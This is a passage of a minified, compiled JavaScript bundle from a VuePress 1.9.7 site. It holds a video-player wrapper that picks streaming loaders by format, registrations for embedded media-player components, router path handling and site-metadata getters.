n(e){cs(this,n),Object(al.a)(this,"src",void 0),Object(al.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e,a,o,i,s,l=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=24;break}if(null!==(e=this.src)&&void 0!==e&&e.type||"string"!=typeof(null===(a=this.src)||void 0===a?void 0:a.url)||(this.src.url.toLowerCase().endsWith(".m3u8")?this.src.type="hls":this.src.url.toLowerCase().endsWith(".flv")?this.src.type="flv":this.src.url.toLowerCase().endsWith(".mpd")&&(this.src.type="shaka")),s=t.e(0).then(t.t.bind(null,389,7)),null===(o=this.src)||void 0===o||!o.type||"string"!=typeof this.src.type){n.next=20;break}n.t0=this.src.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?7:"flv"===n.t0?9:"dash"===n.t0?11:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?13:"music"===n.t0?15:17;break;case 7:return i=Promise.all([Promise.all([t.e(0),t.e(107)]).then(t.t.bind(null,484,7)),s]),n.abrupt("break",18);case 9:return i=Promise.all([Promise.all([t.e(0),t.e(106)]).then(t.t.bind(null,485,7)),s]),n.abrupt("break",18);case 11:return i=Promise.all([Promise.all([t.e(0),t.e(105)]).then(t.t.bind(null,486,7)),s]),n.abrupt("break",18);case 13:return i=Promise.all([Promise.all([t.e(0),t.e(109)]).then(t.t.bind(null,487,7)),s]),n.abrupt("break",18);case 15:return i=Promise.all([Promise.all([t.e(0),t.e(108)]).then(t.t.bind(null,488,7)),s]),n.abrupt("break",18);case 17:i=t.e(0).then(t.t.bind(null,389,7));case 18:n.next=21;break;case 20:i=Promise.all([s]);case 21:return n.next=23,i.then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,a;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(r=Object(Ki.a)(e,1),a=r[0].default,null===(t=l.src)||void 0===t||!t.customInit){n.next=7;break}return n.next=4,l.src.customInit(a,l.src).then((function(n){return n}));case 4:n.t0=n.sent,n.next=8;break;case 7:n.t0=new a(l.src);case 8:return l.player=n.t0,n.abrupt("return",l.player);case 10:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 23:return n.abrupt("return",n.sent);case 24:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}(),xl=Ba.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return{src:{url:"",fluid:!0,fitVideoSize:"auto"},width:"100%",on:{}}.height},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sl()({},n.on),r=Object(rl.a)(Object(rl.a)({},sl()({url:"",fluid:!0,fitVideoSize:"auto"},n.src)),{},{el:n.$refs.sbplayer}),n.player=new kl(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t);case 6:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),wl=[function(n){var e=n.Vue,t=(n.options,n.router,n.siteData);t.pages.map((function(n){var e=n.frontmatter,r=e.date,a=e.author;"string"==typeof r&&"Z"===r.charAt(r.length-1)&&(n.frontmatter.date=function(n){n instanceof Date||(n=new Date(n));return"".concat(n.getUTCFullYear(),"-").concat(nl(n.getUTCMonth()+1),"-").concat(nl(n.getUTCDate())," ").concat(nl(n.getUTCHours()),":").concat(nl(n.getUTCMinutes()),":").concat(nl(n.getUTCSeconds()))}(r)),a?n.author=a:t.themeConfig.author&&(n.author=t.themeConfig.author)})),e.mixin(Zs)},{},function(n){n.Vue.mixin({computed:{$dataBlock:function(){return this.$options.__data__block__}}})},{},{},function(n){var e=n.Vue;e.component("Bilibili",el),e.component("Xigua",tl),e.component("DPlayer",ll),e.component("APlayer",pl),e.component("Artplayer",ul),e.component("Meting",yl),e.component("metingJs",yl),e.component("Xgplayer",xl)}],Sl=[];t(148);var jl=function(n){gl(t,n);var e=bl(t);function t(){return cs(this,t),e.apply(this,arguments)}return ds(t)}(function(){function n(){cs(this,n),this.store=new Ba({data:{state:{}}})}return ds(n,[{key:"$get",value:function(n){return this.store.state[n]}},{key:"$set",value:function(n,e){Ba.set(this.store.state,n,e)}},{key:"$emit",value:function(){var n;(n=this.store).$emit.apply(n,arguments)}},{key:"$on",value:function(){var n;(n=this.store).$on.apply(n,arguments)}}]),n}());Object.assign(jl.prototype,{getPageAsyncComponent:$i,getLayoutAsyncComponent:Ui,getAsyncComponent:Gi,getVueComponent:Ji});var El={install:function(n){var e=new jl;n.$vuepress=e,n.prototype.$vuepress=e}};function Al(n){n.beforeEach((function(e,t,r){if(Tl(n,e.path))r();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){var a=e.path.replace(/\/$/,"")+".html";Tl(n,a)?r(a):r()}else r();else{var o=e.path+"/",i=e.path+".html";Tl(n,i)?r(i):Tl(n,o)?r(o):r()}}))}function Tl(n,e){var t=e.toLowerCase();return n.options.routes.some((function(n){return n.path.toLowerCase()===t}))}var _l={props:{pageKey:String,slotKey:{type:String,default:"default"}},render:function(n){var e=this.pageKey||this.$parent.$page.key;return Hi("pageKey",e),Ba.component(e)||Ba.component(e,$i(e)),Ba.component(e)?n(e):n("")}},Il={functional:!0,props:{slotKey:String,required:!0},render:function(n,e){var t=e.props,r=e.slots;return n("div",{class:["content__".concat(t.slotKey)]},r()[t.slotKey])}},Cl={computed:{openInNewWindowTitle:function(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},Pl=(t(386),t(387),Object(Vs.a)(Cl,(function(){var n=this.$createElement,e=this._self._c||n;return e("span",[e("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[e("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),e("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),e("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports);function Rl(){return(Rl=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,a,o;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return t="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:Ws.routerBase||Ws.base,Al(r=new ji({base:t,mode:"history",fallback:!1,routes:Ks,scrollBehavior:function(n,e,t){return t||(n.hash?!Ba.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})}})),a={},n.prev=4,n.next=7,Promise.all(wl.filter((function(n){return"function"==typeof n})).map((function(n){return n({Vue:Ba,options:a,router:r,siteData:Ws,isServer:e})})));case 7:n.next=12;break;case 9:n.prev=9,n.t0=n.catch(4),console.error(n.t0);case 12:return o=new Ba(Object.assign(a,{router:r,render:function(n){return n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},Sl.map((function(e){return n(e)})))])}})),n.abrupt("return",{app:o,router:r});case 14:case"end":return n.stop()}}),n,null,[[4,9]])})))).apply(this,arguments)}Ba.config.productionTip=!1,Ba.use(ji),Ba.use(El),Ba.mixin(function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:Ba;Ei(e),t.$vuepress.$set("siteData",e);var r=n(t.$vuepress.$get("siteData")),a=new r,o=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(a)),i={};return Object.keys(o).reduce((function(n,e){return e.startsWith("$")&&(n[e]=o[e].get),n}),i),{computed:i}}((function(n){return function(){function e(){cs(this,e)}return ds(e,[{key:"setPage",value:function(n){this.__page=n}},{key:"$site",get:function(){return n}},{key:"$themeConfig",get:function(){return this.$site.themeConfig}},{key:"$frontmatter",get:function(){return this.$page.frontmatter}},{key:"$localeConfig",get:function(){var n,e,t=this.$site.locales,r=void 0===t?{}:t;for(var a in r)"/"===a?e=r[a]:0===this.$page.path.indexOf(a)&&(n=r[a]);return n||e||{}}},{key:"$siteTitle",get:function(){return this.$localeConfig.title||this.$site.title||""}},{key:"$canonicalUrl",get:function(){var n=this.$page.frontmatter.canonicalUrl;return"string"==typeof n&&n}},{key:"$title",get:function(){var n=this.$page,e=this.$page.frontmatter.metaTitle;if("string"==typeof e)return e;var t=this.$siteTitle,r=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?r?r+" | "+t:t:r||"VuePress"}},{key:"$description",get:function(){var n=function(n){if(n){var e=n.filter((function(n){return"description"===n.name}))[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}},{key:"$lang",get:function(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}},{key:"$localePath",get:function(){return this.$localeConfig.path||"/"}},{key:"$themeLocaleConfig",get:function(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}},{key:"$page",get:function(){return this.__page?this.__page:function(n,e){for(var t=0;t<n.length;t++){var r=n[t];if(r.path.toLowerCase()===e.toLowerCase())return r}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}}]),e}()}),Ws)),Ba.component("Content",_l),Ba.component("ContentSlotsDistributor",Il),Ba.component("OutboundLink",Pl),Ba.component("ClientOnly",{functional:!0,render:function(n,e){var t=e.parent,r=e.children;if(t._isMounted)return r;t.$once("hook:mounted",(function(){t.$forceUpdate()}))}}),Ba.component("Layout",Ui("Layout")),Ba.component("NotFound",Ui("NotFound")),Ba.prototype.$withBase=function(n){var e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.7",hash:"270c1ca"},function(n){return Rl.apply(this,arguments)}(!1).then((function(n){var e=n.app;n.router.onReady((function(){e.$mount("#app")}))}))}]);